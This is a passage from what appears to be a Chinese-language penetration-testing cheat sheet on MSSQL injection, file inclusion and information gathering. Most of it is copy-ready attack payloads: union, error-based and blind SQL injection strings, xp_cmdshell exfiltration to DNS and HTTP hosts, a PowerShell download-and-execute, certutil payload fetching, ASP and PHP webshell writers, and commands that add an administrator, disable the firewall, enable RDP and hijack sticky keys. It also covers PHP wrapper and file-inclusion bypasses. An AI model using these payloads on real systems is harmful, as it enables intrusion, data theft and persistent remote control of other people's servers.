| ----------------- | -------------------------------------------------- |
| **db_owner**      | **可以执行数据库中几乎所有动作的用户**             |
| db_accessadmin    | 可以添加、删除用户的用户                           |
| db_datareader     | 可以查看所有数据库中用户表内数据的用户             |
| db_datawriter     | 可以添加、修改或删除所有数据库中用户表内数据的用户 |
| db_ddladmin       | 可以在数据库中执行所有DDL操作的用户                |
| db_backoperator   | 可以备份数据库的用户                               |
| db_denydatareader | 不能看到数据库中任何数据的用户                     |
| db_denydatawriter | 不能改变数据库中任何数据的用户                     |
| **public**        | 提供了所有默认权限                                 |

### 4. 内置表

| 视图表                         | 说明                         |
| ------------------------------ | ---------------------------- |
| **sys.databases(新式)**        | **所有数据库**               |
| sys.tables(新式)               | 所有表                       |
| sys.columns(新式)              | 所有字段                     |
| sys.sql_login                  | 所有登录名                   |
| information_schema.schemata    | 当前用户数据库中的角色       |
| **information_schema.tables**  | **当前用户数据库中的表**     |
| **information_schema.columns** | **当前用户数据库中的列**     |
| sys.all_columns                | 所有列的集合                 |
| sys.database_principals        | 数据库中每个权限或列异常权限 |
| sys.database_files             | 存储在数据库中的数据库文件   |
| sys.sysdatabases(旧式)         | 数据库中创建的每个数据库     |
| sys.sysobjects(旧式)           | 数据库中创建的每个对象       |
| sys.syscolumns(旧式)           | 数据库中的所有字段名         |

### 5. 注入类型

#### (1). 联合注入

```sql
1. 获取当前数据库名
	id=0' union select top 1 1,2,db_name() --+	
	id=0' union select top 1 1,2,name from master.sys.databases  --+
2. 获取其他数据库名
	id=0' union select top 1 1,2,name from master.sys.databases where name not in (select top m name from master.sys.databases) --+		'#m表示除当前数据库外的其他名称
3. 获取当前表名
	id=0' union select top 1 1,2,table_name from information_schema.tables --+   '
4. 获取所有表名
	id=0' union select top 1 1,2,table_name from information_schema.tables where table_name not in(select top m table_name from information_schema.tables)  --+	'#m代表表位置
5. 获取当前列名
	id=0' union select top 1 1,2,column_name from information_schema.columns --+'	
6. 获取所有列名
	id=0' union select top 1 1,2,column_name from information_schema.columns where table_name='users' and column_name not in (select top m column_name from information_schema.columns where table_name='users') --+	'#m代表字段位置
7. 获取当前数据
	id=0' union select top 1 1,username,password from users --+		'
8. 获取所有数据
	id=0' union select top 1 1,username,password from users where username not in(select top m username from users) and password not in(select top m password from users) --+		'#m代表第几行数据
```

#### (2). 报错注入

##### a. 方式

> * 1 = 语句
> * 语句 > 0

##### b. 涉及函数

> quotename(字段)、cast(name as int)、convert(int,name)

```sql
#1. quotename函数
	id=1 and 1=(select quotename(count(name) from sys.databases where database_id=1)) --+
#2. cast函数
	id=1 and 1=(select cast(name as int) from sys.databases where database_id=1) --+
#3. convert函数
    id=1 and 1=(select convert(int,name) from sys.databases where database_id=1) --+
```



##### c. 注入流程

###### ①获取数据库信息

```sql
#1. 判断注入点
	id=1'			'#报错，	=>		字符型
	id=1 and 1=1	#返回正常
	id=1 and 1=2	#返回错误		=>  数字型
#2. 判断是否为MSSQL数据库
	id=1 and exists(select * from sysobjects) --+	#返回正常为mssql
	id=1 and exists(select count(*) from sysobjects) --+
#3. 判断数据库版本号
	id=1 and @@version>0 --+
	#@@version为mssql的全局变量，暴露出数据库信息
#4. 判断当前服务器角色是否拥有比较高的权限
	id=1 and 1=(select is_srvrolemember('sysadmin')) --+	#是否为sysadmin权限
#5. 判断当前数据库角色是否为DB_OWNER
	id=1 and 1=(select is_member('db_owner')) --+	 	#是否为db_owner权限
#6. 获取当前用户名字
	id=1 and user_name()>0 --+
```

###### ②获取数据库名

```sql
#1. 获取当前数据库
	id=1 and db_name()>0 --+
    id=1 and 1=db_name() --+
#2. 获取数据库的个数
	id=1 and 1=(select quotename(count(name) from master.sys.dbo.databases)) --+
#3. 获取所有数据库名 
	id=1 and (select name from master.sys.dbo.databases where database_id=1)>0 #
	or
	id=1 and 1=(select quotename(name) from master.sys.dbo.databases FOR XML PATH('')) --+
```

###### ③获取表名

```sql
#1. 获取第一个表名
	id=1 and 1=(select top 1 table_name from information_schema.tables) --+
#2. 获取其他表名
	id=1 and 1=(select top 1 table_name from information_schema.tables where table_name not in(select top m table_name from information_schema.tables)) --+		#m为第几个表
	or
	id=1 and 1=(select quotename(table_name) from information_schema.tables FOR XML PATH('')) -+
```

###### ④获取字段名

```sql
#1. 获取当前字段名
	id=1 and 1=(select top 1 column_name from information_schema.columns where table_name='users') --+
#2. 获取所有字段名
	id=1 and 1=(select top 1 column_name from information_schema.columns where table_name='users' and column_name not in('id','username','password')) --+		#后面跟表的字段
	or
    id=1 and 1=(select quotename(column_name) from information_schema.columns where table_name='users' FOR XML PATH('')) --+
```

###### ⑤具体数据

```sql
#1. 获取数据
	id=1 and 1=(select password from users where id=1) --+
	or
    id=1 and 1=(select quotename(username),quotename(password) from users FOR XML PATH('')) --+
```

#### (3). 布尔盲注

##### a. 涉及函数

> ascii()、substring()

##### b. 注入流程

##### ①数据库信息

###### ②库名长度、库名

```sql
#1. 判断第一个数据库名长度
	1 and len(db_name()) >m --+		#m表示长度
#2. 获取数据库名
	id=1 and (ascii(substring((select top 1 name from sys.sysdatabases),n,1),1,1)=m)  --+	#n表示第几个字符，m表示ascii范围
```

###### ③表名长度、表名

```sql
#1. 判断第一张表名长度
	id=1 and len((select top 1 table_name from information_schema.tables))>10 --+		#m表示长度
#2. 暴力破解第一张表名
	1 and ascii(substring((select top 1 table_name from information_schema.tables),n,1))=m --+	#n表示第几个字符，m表示ascii范围
```

###### ④字段名长度、字段名

```sql
#1. 判断第一张表第一个字段名长度
	id=1 and len((select top 1 column_name from information_schema.columns))>10 --+		#m表示长度
 
使用二分法，判断出字段名长度为2
#2. 暴力破解第一张表第一个字段名
	1 and ascii(substring((select top 1 column_name from information_schema.columns),n,1))=m --+	#n表示第几个字符，m表示ascii范围
```

###### ⑤具体数据

```sql
#1. 判断第一行数据第一个字段的长度
	id=1 and len((select top 1 id from emails))=m --+	#m表示长度
#2. 暴力破解该数据
```

#### (4). 时间盲注

##### a. 涉及函数

> ``WAITFOR DELAY 'h:m:s'``、ascii()、substring()

##### b. 注入流程

###### ①获取数据库信息

###### ②库名长度、库名

```sql
#1.	判断数据库名长度
	id=1 if(len(db_name()) >m) waitfor delay '0:0:5' --+	#m表示长度
 
#2. 暴力破解数据库名
	id=1 if(ascii(substring((select db_name()),n,1))=m) waitfor delay '0:0:5' --+	#n表示第几个字符，m表示ascii范围
```

###### ③表名长度、表名

```sql
#1. 判断第一张表名长度
	1 if(len((select top 1 table_name from information_schema.tables))>m) waitfor delay '0:0:5' --+		#m表示长度
#2. 暴力破解第一张表名
	1 if(ascii(substring((select top 1 table_name from information_schema.tables),n,1))=m) waitfor delay '0:0:5' --+	#n表示第几个字符，m表示ascii范围
```

###### ④字段名长度、字段名

```sql
#1. 判断第一张表第一个字段名长度
1 if(len((select top 1 column_name from information_schema.columns))>m) waitfor delay '0:0:5' --+		#m表示长度
#2. 暴力破解第一张表第一个字段名
1 if(ascii(substring((select top 1 column_name from information_schema.columns),n,1))=m) waitfor delay '0:0:5' --+		#n表示第几个字符，m表示ascii范围
```

###### ⑤具体数据

```sql
#1. 判断第一行第一个字段的数据长度
1 if(len((select top 1 id from emails))>m) waitfor delay '0:0:5' --+	#m表示长度
#2. 暴力破解数据内容
```

#### (5). 数据外带

****

##### a. DNS

###### ①获取数据库

```mssql
id=1;declare @a varchar(8000);set @a=db_name();exec('master..xp_cmdshell "ping.exe '%2b%@a%2b'.Laffrex.eyes.sh -n 1"') --+
```

![](http://113.45.142.235:9001/laffrex/pictures/DNS%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93.png)

###### ②获取表

```sql
#1. 获取当前表名
   id=1;declare @a varchar(8000);set @a=(select top 1 table_name from information_schema.tables) ;exec('master..xp_cmdshell "ping.exe '%2b%@a%2b'.Laffrex.eyes.sh -n 1"') --+
#2. 获取所有表名 
   id=1;declare @a varchar(8000);set @a=(select top 1 table_name from information_schema.tables where table_name not in (select top 2 table_name from information_schema.tables)) ;exec('master..xp_cmdshell "ping.exe '%2b%@a%2b'.Laffrex.eyes.sh -n 1"') --
```

![](http://113.45.142.235:9001/laffrex/pictures/DNS%E8%8E%B7%E5%8F%96%E8%A1%A8.png)

![](http://113.45.142.235:9001/laffrex/pictures/3d3e0268518c770bb541b03d30044e1b.png)

###### ③获取字段

```sql
#1.获取当前字段名
   id=1;declare @a varchar(8000);set @a=(select top 1 column_name from information_schema.columns) ;exec('master..xp_cmdshell "ping.exe '%2b%@a%2b'.Laffrex.eyes.sh -n 1"') --+
#2.获取所有字段名
	id=1;declare @a varchar(8000);set @a=(select top 1 column_name from information_schema.columns where column_name not in (select top 2 column_name from information_schema.columns)) ;exec('master..xp_cmdshell "ping.exe '%2b%@a%2b'.Laffrex.eyes.sh -n 1"') --+
```

![](http://113.45.142.235:9001/laffrex/pictures/fc4f904f2105c14f1f4ce16dd93c068b.png)

![](http://113.45.142.235:9001/laffrex/pictures/5d5e9f9f7b832571b9e846c0b7e9f8c4.png)

###### ④具体数据

****

##### b. HTTP

###### ①数据库名

```sql
id=1;declare @a varchar(8000);set @a=db_name();exec('master..xp_cmdshell "powershell IEX(new-object net.webclient).downloadstring(''http://192.168.72.12:8000?data='%2b@a%2b''')"') --+
```

![](http://113.45.142.235:9001/laffrex/pictures/HTTP%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93.png)

###### ②表名

```sql
id=1;declare @a varchar(8000);set @a=(select top 1 table_name from information_schema.tables);exec('master..xp_cmdshell "powershell IEX(new-object net.webclient).downloadstring(''http://192.168.72.12:8000?data='%2b@a%2b''')"') --+
```

![](http://113.45.142.235:9001/laffrex/pictures/HTTP%E8%8E%B7%E5%8F%96%E8%A1%A8.png)

###### ③字段名

```sql
id=1;declare @a varchar(8000);set @a=(select top 1 column_name from information_schema.columns);exec('master..xp_cmdshell "powershell IEX(new-object net.webclient).downloadstring(''http://192.168.72.12:8000?data='%2b@a%2b''')"') --+
```

![](http://113.45.142.235:9001/laffrex/pictures/HTTP%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5.png)

****

##### c. SMB

###### ①数据库名

```sql
id=1;declare @a varchar(1024);set @a=db_name();exec('master..xp_subdirs "//'%2b'192.168.172.100\\'%2b@a%2b'.txt"') --+
```

###### ②表名

```sql
id=1;declare @a varchar(1024);set @a=(select top 1 table_name from information_schema.tables);exec('master..xp_subdirs "//'%2b'192.168.172.100\\'%2b@a%2b'.txt"') --+
```

###### ③字段名

```sql
id=1;declare @a varchar(1024);set @a=(select top 1 column_name from information_schema.columns);exec('master..xp_fileexist "//'%2b'192.168.71.11\\'%2b@a%2b'.txt "') --+
```

### 6. 存储过程

#### (1). 定义

* 一组为了完成特定功能的**SQL语句集合**，经编译后存储在数据库中，用户通过**指定存储过程的名称**并**给出参数**来执行

#### (2). 系统存储过程

* 以 ``sp_`` 开头

##### a. 利用条件

> 1. 已获取到**sqlserver sysadmin权限用户**的账号与密码、且**未降权**(2019版本sa用户权限为mssqlserver)
> 2. sqlserver**允许远程连接**
> 3. 已**开启sp_oacreate**
> 4. **OLE Automation Proccedures**选项开启

****

##### b. 语法

1. sp_oacreate是创建OLE对象的**实例**

   * sp_oacreate可以用于**对文件删除、复制、移动**等操作，可配合sp_oamethod调用系统**wscript.shell**来执行系统命令

     ```mssql
     语法
     	EXEC sp_OACreate @ProgID(@CLSID), @Object OUTPUT;
     ```

2. sp_oamethod是一个调用OLE对象的**方法**

   * 与sp_oacreate结合使用，分别用于**创建**和**执行脚本语言**

     ```mssql
     语法：
     	EXEC sp_OAMethod @Object, @MethodName, @ReturnValue OUTPUT, [@Parameter1, @Parameter2, ...];
     ```

3. 组合sp_oacreate、sp_oamethod可执行命令，但**无回显**

****

##### c. 流程

1. 启用sp_oacreate

   ```mssql
   EXEC sp_configure 'show advanced options',1;
   RECONFIGURE WITH OVERRIDE;
   EXEC sp_configure 'Ole Automation Procedures',1;
   RECONFIGURE WITH OVERRIDE;
   ```

2. 执行系统命令

****

##### d. 利用方法

###### ①只使用2个方法

1. 执行命令

```mssql
declare @shell int EXEC sp_oacreate 'wscript.shell',@shell output EXEC sp_oamethod @shell,'run','null','c:\windows\system32\cmd.exe /c whoami > c:\\1.txt' 
	拆分如下：
declare @shell int 		//定义变量shell
EXEC sp_oacreate 'wscript.shell',@shell output 		//创建一个 WScript.Shell对象，并将其句柄赋值给变量shell
EXEC sp_oamethod @shell,'c:\windows\system32\cmd.exe /c whoami > c:\\1.txt' //通过shell来执行系统命令
```

2. 写Webshell

```mssql
declare @o int,@f int,@ret int
EXEC sp_oacreate 'scripting.filesystemobject', @o out
EXEC sp_oamethod @o,'createtextfile',@f out,'c:\inetpub\wwwroot\shell.asp',1
EXEC @ret=sp_oamethod @f,'writeline',NULL,'<%25execute(request("cmd"))%25>'
```

****

###### ②2个方法+COM组件

```mssql
declare @luan int,@exec int,@text int,@str varchar(8000);
EXEC sp_oacreate ' ',@luan output;	//该句柄对应Wscript.Shell
EXEC sp_oamethod @luan,'exec',@exec output,'C:\windows\system32\cmd.exe /c whoami';
EXEC sp_oamethod @exec,'stdOut',@text out;
EXEC sp_oamethod @test,'readall',@str out;
select @str;
```

****

###### ③使用工具

* 使用**SharpSQLTools**，可实现上传、下载文件，**xp_cmdshell与sp_oacreate双回显**和clr加载程序集执行相应功能

```mssql
SharpSQLTools.exe 192.168.172.150 sa[username] ICQsafe666[password] master enable_ole
SharpSQLTools.exe 192.168.172.150 sa[username] ICQsafe666[password] master sp_oacreate whoami
```

#### (3). 本地存储过程

* 利用CLR(Common Language Infrastruvture,公共语言基础结构，使用工具**SharpSQLTools**

```mssql
SharpSQLTools.exe 192.168.172.150 [username] [password] master install-clr
SharpSQLTools.exe 192.168.172.150 [username] [password] master enable_clr
SharpSQLTools.exe 192.168.172.150 [username] [password] master clr_efspotato whoami
```

#### (4). 扩展存储过程

* 以 ``xp_`` 开头，主要使用**外部程序语言**编写的存储过程

##### a. 使用前提

> 1. 当前用户拥有**DBA权限**
>
> 2. 依赖于**xplog70.dll**
>
> 3. 存储过程存在并已启用
>
>    ```mssql
>    EXEC sp_configure 'show advanced options',1;
>    RECONFIGURE WITH OVERRIDE;
>    ```

##### b. 流程

1. 判断是否为DBA权限

   ```mssql
   select is_srvrolemember('sysadmin');	
   ```

2. 查看是否存在xp_cmdshell

   ```mssql
   select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
   ```

3. 开启xp_cmdshell

   ```mssql
   EXEC sp_configure 'show advanced options',1;
   RECONFIGURE WITH OVERRIDE;	
   EXEC sp_configure 'xp_cmdshell',1;
   RECONFIGURE WITH OVERRIDE;
   ```

4. 指令执行完毕后，关闭xp_cmdshell

   ```mssql
   EXEC sp_configure 'show advanced options',1;
    RECONFIGURE WITH OVERRIDE;	
    EXEC sp_configure 'xp_cmdshell',0;
    RECONFIGURE WITH OVERRIDE;
   ```

##### c. 常见函数

###### ①xp_cmdshell

* 添加与删除

  ```mssql
  --  1. 删除xp_cmdshell扩展存储过程
  	EXEC sp_dropextendedproc 'xp_cmdshell'
  --  2. 重新添加xp_cmdshell扩展存储过程
  	EXEC sp_addextendedproc xp_cmdshell,@dllname='xplog70.dll' declare @o int;
  	sp_addextendedproc 'xp_cmdshell','xpsql70.dll';
  --  3. 彻底删除xp_cmdshell扩展存储过程
  	在C盘里直接搜索xplog70.dll，然后删除xp_cmdshell
  ```

  

###### ②xp_subdirs

* 读取文件夹内的文件夹列表

  ```mssql
  --得到给定文件夹内的文件夹列表
  	EXEC master..xp_subdirs 'c:\';
  ```

****

###### ③xp_dirtree

* 显示子目录，有3个参数，分别是

* > ```mssql
  >  --   -directory	
  >      要查询的目录
  >  --   -depth
  >      显示子目录的深度
  >  --   -file
  >      是否显示子目录中的文件，默认为0，即不显示任何文件，只显示子目录
  > ```

  ```mssql
  -- 1. 显示C盘所有文件和目录
   	EXEC master..xp_dirtree 'c:\';
  -- 2. 显示C盘所有目录
      EXEC master..xp_dirtree 'c:\',1;
  -- 3. 显示指定目录下的目录和文件
      EXEC master..xp_dirtree 'C:\inetpub\',1,1;
  ```

****

###### ④xp_create_subdir()

* 用于创建子目录

  ```mssql
  --  在C盘下创建test文件夹
  	EXEC master..xp_create_subdir 'c:\test';
  ```

###### ⑤xp_fileexist()

* 判断文件是否存在，返回有3个字段的数据，分别是(是否为**文件**，是否为**目录**，是否有**父目录**)

  ```mssql
  EXEC master..xp_fileexist 'c:\windows\win.ini';
  ```

###### ⑥xp_regwrite()、xp_regread()

* 用于对**注册表进行修改**或**读取**，替换成任意值，造成**映像劫持**

##### d. 利用方法

###### ①写Webshell

```mssql
--  1. 查询web根目录路径
	EXEC master..xp_cmdshell 'where /r c:\*.asp'
--  2. 利用xp_cmdshell写Webshell,找绝对路径可以where命令和其他扩展存储过程组合利用
	EXEC master..xp_cmdshell 'echo ^<%eval request("cmd")%^> > c:\intepub\wwwroot\shell.asp'	--Windows的转义符为^，Linux的转义符为 \
```

###### ②远程桌面上线

```mssql
--  1. 查看是否禁用xp_cmdshell
    id=0 union select 1,2,count(*) from master..sysobjects where xtype='X' and name='xp_cmdshell' --+
    or
    id=1 and 1=(select count(*) from master.sys.sys.objects where name='xp_cmdshell') --+
--  2. 开启xp_cmdshell
	id=0;EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE; --+
--  3. 测试是否成功
	id=1;EXEC master.sys.xp_cmdshell 'ping -n 1 Laffrex.eyes.sh' --+
--  4. 开启RDP服务
	id=1;EXEC master.sys.xp_cmdshell 'REG ADD HELM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f' --+  
--  5. 关闭防火墙
	id=1;EXEC master.sys.xp_cmdshell 'netsh firewall set opmode disable' --+
--  6. 添加登录用户
	id=1;EXEC master.sys.xp_cmdshell 'net user admin 1qaz!QAZ /add' --+
	id=1;EXEC master.sys.xp_cmdshell 'net localgroup administrators admin /add' --+
```

###### ③映像劫持

1. 未禁止注册表编辑(即写入功能)

2. xp_regwrite启用

   ```mssql
   --  检测是否启用
   	select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_regwrite'
   --  启用
   	EXEC sp_configure 'show advanced options',1
   RECONFIGURE
   	EXEC sp_configure 'xp_regwrite',1
   RECONFIGURE
   ```

```mssql
--  1. 将粘滞键启动结果替换成cmd命令窗口启动
	EXEC master..xp_regwrite @rootkey='HKEY_LOCAL_MACHINE',@key='SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution Options\Sethc.EXE',@value_name='Debugger',@type='REG_SZ',@value='c:\windows\system32\cmd.exe'
--  2. 开启3389端口
	EXEC master..xp_regwrite 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;
	or
EXEC master..xp_cmdshell 'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f' 
```

###### ④powershell上线cs

```mssql
id=1;EXEC master..xp_cmdshell 'certutil.exe -f -split -urlcache http://192.168.172.150:9090/payload64.txt c:\\inetpub\\wwwroot\\payload1.bat' --+
    	id=1';EXEC master..xp_cmdshell 'c:\\inetpub\\wwwroot\\payload1.bat' --+
```

###### ⑤结合工具

```mssql
--  SharpSQLTools利用xp_cmdshell
    	SharpSQLTools.exe 192.168.172.150 [username] [password] master enable_xp_cmdshell
    	SharpSQLTools.exe 192.168.172.150 [username] [password] master xp_cmdshell whoami
```

#### (5). Getshell

##### a. 条件

1. web路径已知
2. sa或DBA权限(db_owner权限)

##### b. 方法

* 涉及到**xp_cmdshell、xp_dirtree、xp_subdirs、xp_regread**存储过程

###### ①利用存储过程写shell

1. xp_cmdshell

   ```mssql
   EXEC master..xp_cmdshell 'echo ^<%eval request("cmd")%^> > c:\inetpub\wwwroot\shell.asp';
   ```

2. sp_oacreate

   ```mssql
   declare @o int,@f int,@t int,@ret int
   EXEC sp_oacreate 'scripting.filesystemobject',@o OUT
   EXEC sp_oamethod @o,'createtextfile',@f OUT,'c:\inetpub\wwwroot\shell.asp',1
   EXEC @ret=sp_oamethod @f,'writeline',NULL,'^<%execute(request("cmd"))%^>'
   ```

3. 本地存储过程CLR’

   ```
   直接利用sharpSQLTools执行命令写shell进行利用
   ```

###### ②log备份写shell

1. 优点

   1. 重复性好，多次备份的成功率高
   2. 相对于差异备份而言，shell的体积小

2. 利用条件

   1. 至少DBO权限，默认SA满足
   2. 知道绝对路径且目录可写
   3. 站库不分离，数据库和网站在同一台服务器
   4. 数据库必须被备份过一次

3. 操作

   ![log日志备份](http://113.45.142.235:9001/laffrex/pictures/差异备份.png)

###### ③差异备份写shell

1. 特点

   1. 容错率较差，条件相对苛刻

2. 利用条件

   1. 至少DBO权限
   2. 知道绝对路径且目录可写
   3. HTTP 500错误不是自定义
   4. 站库不分离，数据库中不能存在%
   5. 数据量不能太大

3. 操作

   ![差异备份](http://113.45.142.235:9001/laffrex/pictures/%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BD.png)

## 文件包含

### 1. 定义

* 把**可重复使用的函数**写入到单个文件中，在使用该函数时，**直接调用此文件**，而无需再次编写函数，这一过程叫做包含

### 2. 产生条件

1. 用户可以**控制**包含文件的**传参内容**
2. 服务端**未过滤或未严格过滤**参数传入内容

### 3. 相关函数

> **include()、include_once()、**
>
> **require()、require_once()**、
>
> highlight_file()、show_source()、
>
> readfile()、file_get_contents()、fopen()、file()

### 4. 防御

> 1. 尽量不使用动态包含，使用静态页面
> 2. 路径限制
> 3. 严格过滤传入参数(`.` `\` `/`)
> 4. **禁用远程文件**包含
> 5. 包含文件**验证**

### 5. 分类

#### (1). 本地文件包含LFI

##### a. 条件

> 1. **allow_url_fopen = ON**
> 2. 用户可以动态控制变量
> 3. 知道相对路径/绝对路径

##### b. 利用

###### ①读取本地文件

1. 绝对路径读取本地host文件

   1. Windows

      ```apl
      C:\\Windows\System32\drivers\etc\hosts
      ```

   2. Linux

      ```apl
      /etc/hosts
      ```

2. 相对路径读取本地host文件

   1. Windows

      ```apl
      ..\..\..\..\Windows\System32\drivers\etc\hosts
      ```

   2. Linux

      ```apl
      ..\..\..\etc\hosts
      ```

###### ②包含图片马

* 利用文件包含漏洞直接包含木马图片

```apl
/action.php?action=../muma.jpg
```

##### c. 绕过

* 代码形式(自带拼接后缀)

```apl
<?php
	$filename=$_GET['filename'];
	include $filename.'.php';
?>
```

###### ①%00截断

1. 满足条件

   > * magic_quotes_gpc = Off
   > * php版本 < 5.2.4

2. 形式

   ```apl
   /action.php?action=phpinfo.php%00
   ```

###### ②路径长度截断

1. 满足条件

   > * Windows下要长于**198字符**，超出部分会被丢弃
   > * **php < 5.3.4**
   > * 操作系统版本要是**低版本(例如Win7)**

2. 形式

   ```apl
   /action.php?action=phpinfo.php/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././
   ```

###### ③点号截断

1. 满足条件

   > * Windows下要长于**198字符**，超出部分会被丢弃
   > * **php < 5.3.4**
   > * 操作系统版本要是**低版本(例如Win7)**

2. 形式

   ```apl
   /action.php?action=phpinfo.php.....................................................................................................................................................................................................................................................
   ```

****

#### (2). 远程文件包含RFI

##### a. 条件

> 1. **allow_url_include = On**		(默认为Off)
> 2. allow_url_fopen = On   (是否允许打开远程文件)
> 3. 用户可以**动态控制变量**

##### b. 利用

```sql
#通过http协议加载目标机中的info.php文件
	[URL]?file= http://ip/info.php	
#通过ftp协议加载目标机中的info.php文件	
	[URL]?file= ftp://用户名:密码@ip/info.php	
```

![远程包含](http://113.45.142.235:9001/laffrex/pictures/QQ_1725696213402.png)

##### c. 绕过

1. 问号(``?``)绕过

   ```php
   [URL]?file=http://192.168.172.150/shell.asp?
   ```

2. 井号(``#``)绕过

   ```php
   [URL]?file=http://192.168.172.150/shell.asp%23
   ```

3. 空格绕过

   ```php
   [URL]?file=http://192.168.172.150/shell.asp%20
   	or
   [URL]?file=http://192.168.172.150/shell.asp+
   ```

****

### 6. 漏洞利用

#### (1). 端口探测

```php
url=dict://ip:80
[URL]?action=dict://192.168.41.46:80	//探测80端口
```

#### (2). 包含上传的Wetshell

* 上传图片马，利用文件包含调用图片马，使用工具进行连接

#### (3). 包含日志文件Getshell

* **构造报错信息写进错误日志**

#### (4). 远程文件包含写Shell

```php
<?php
	fputs(fopen('shell.php','w'),'<?php eval($_POST['cmd']);?>');    
?>
```

#### (5). 使用**PHP伪协议**写Getshell

****

### 7. 伪协议

#### (1). 定义

* 伪协议不同于网上真实存在的协议，而是为**关联应用程序而使用的**

| 伪协议  | 说明                |
| ------- | ------------------- |
| file:// | 访问本地文件系统    |
| http:// | 访问HTTP(s)网址     |
| ftp://  | 访问FTP(s)的URLS    |
| php://  | 访问各个输入/输入流 |
| zlib:// | 压缩流              |
| data:// | 数据(RFC2397)       |
| rar://  | RAR                 |

#### (2). 分类

##### a. file://协议

1. 用途

   * 访问到**本地系统文件**

2. 使用条件

   > * 知道**绝对路径**

3. 使用方法

   ```
   file://path/filename	(绝对路径)
   ```

4. 案例

   ```php
   [URL]?action=file://c:\Windows\System32\drivers\etc\hosts
   ```

![file伪协议使用](http://113.45.142.235:9001/laffrex/pictures/file伪协议使用.png)

****

##### b. php://filter协议

1. 用途

   * 常用于**读取文件\源码**

2. 使用条件

   > * 知道**相对路径或绝对路径**

3. 使用方法

   * 通过指定末尾的文件，可以获取**经base64加密后的文件源码**，之后再base64解码，虽然不能直接获取到shell，但能**读取敏感文件**

   ```php
   [URL]?action=php://filter/read=convert.base64-encode/resource=4filename
   ```

4. 案例

   ```php
   [URL]?action=php://filter/read=convert.base64-encode/resource=shell.php
   ```

   ![php：filter伪协议1](http://113.45.142.235:9001/laffrex/pictures/php：filter伪协议1.png)

****

##### c. php://input协议

1. 用途

   * 可以访问请求的**原始数据的只读流**，将**post请求中的数据作为PHP代码执行**

2. 使用条件

   > * **allow_url_include = on**

3. 使用方法

   ```
   1. 抓包后，在url栏后面加上?action=php://input
   2. 在正文部分添加php代码
   ```

4. 案例

   ![php：input伪协议](http://113.45.142.235:9001/laffrex/pictures/php：input伪协议.png)

   ![php：input伪协议结果](http://113.45.142.235:9001/laffrex/pictures/php：input伪协议结果.png)

****

##### d. data://协议

1. 用途

   * 执行**接受数据中**包含的**php代码**

2. 使用条件

   > * **allow_url_fopen = on**
   > * **allow_url_include = on**

3. 使用方法

   ```php
   [URL]?file=data:text/plain,<?php phpinfo();?>
   	or
   [URL]?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=	//base64加密后内容
       or
   [URL]?file=data://text/plain,<?php phpinfo();?>
   ```

4. 案例

   ![](http://113.45.142.235:9001/laffrex/pictures/data伪协议.png)

   ![data伪协议2](http://113.45.142.235:9001/laffrex/pictures/data伪协议2.png)

   ![data伪协议3](http://113.45.142.235:9001/laffrex/pictures/data伪协议3.png)

****

##### e. zip://协议

1. 用途

   * 读取**压缩包**内的文件，如果**包含php代码就直接执行**

2. 使用条件

   > * 知道**相对路径或绝对路径**

3. 使用方法

   ```php
   zip://archive.zip#dir/file.txt
   	or
   zip://[相对路径/绝对路径]#[压缩文件内的子文件名]
   ```

4. 案例

   ```php
   [URL]?file=zip://D:/WWW/file.zip%23phpcode.txt
   	or
   [URL]?file=zip://D:/WWW/file.zip%23php/phpcode.txt
       or
   [URl]?file=zip://D:/WWW/file.jpg%23phpcode.txt
   ```

![zip伪协议](http://113.45.142.235:9001/laffrex/pictures/zip伪协议.png)

****

##### f. phar://协议

1. 用途

   * 读取压缩包内的文件

2. 使用条件

   > * 知道**相对路径或绝对路径**
   > * php版本 > 5.3

3. 使用方法

   ```php
   [URL]?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt
   	or
   [URL]?file=phar://test.zip/phpinfo.txt
   ```

4. 案例

   ```php
   http://192.168.172.150/include.php?file=phar://shell.zip/shell.txt
   ```

****

##### g. compress.bzip2://

1. 用途

   * 读取压缩包内的文件

2. 使用条件

   > * 知道**相对路径或绝对路径**

3. 使用方法

   * 压缩bzip2文件的方法：

     **Bzip2 -k shell.txt**

   ```php
   [URL]?file=compress.bzip2://shell.txt.bz2
   ```

4. 案例

   ```php
   http://192.168.172.150/include.php?file=compress.bzip2://shell.txt.bz2
   ```

![compress：bzip2伪协议](http://113.45.142.235:9001/laffrex/pictures/compress：bzip2伪协议.png)

****

##### h. compress.zlib://

1. 用途

   * 读取压缩包内的文件

2. 使用条件

   > * 知道**相对路径或绝对路径**

3. 使用方法

   ```php
   [URL]?file=compress.zlib://shell.zip#shell.txt
   ```

4. 案例

   ```php
   http://192.168.172.150/include.php?file=compress.zlib://shell.zip#shell.txt
   ```

![compress：zlib](http://113.45.142.235:9001/laffrex/pictures/compress：zlib.png)

![其他PHP伪协议的使用](http://113.45.142.235:9001/laffrex/pictures/其他PHP伪协议的使用.png)

## 信息收集

### 1. 内容与流程

> 1. 服务器的配置信息
> 2. 网站的信息
>    * 网站**注册人**
>    * 目标**网站系统**
>    * 目标**服务器系统**
>    * 目标网站相关**子域名**
>    * 目标网站的**目录结构**
>    * 目标服务器的**开放端口**
> 3. 只要与目标网站相关联的信息，都应该尽量去收集

![信息收集2](http://113.45.142.235:9001/laffrex/pictures/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%862.png)

### 2. Google Hacking

#### (1). 语法

##### a. site

* 找到与指定网站**有联系**的url

* ```apl
  site:baidu.com
  ```

##### b.inurl/allinurl

* 返回**url**中含有关键词的网页，或指定**多个关键词**

* ```apl
  inurl:login
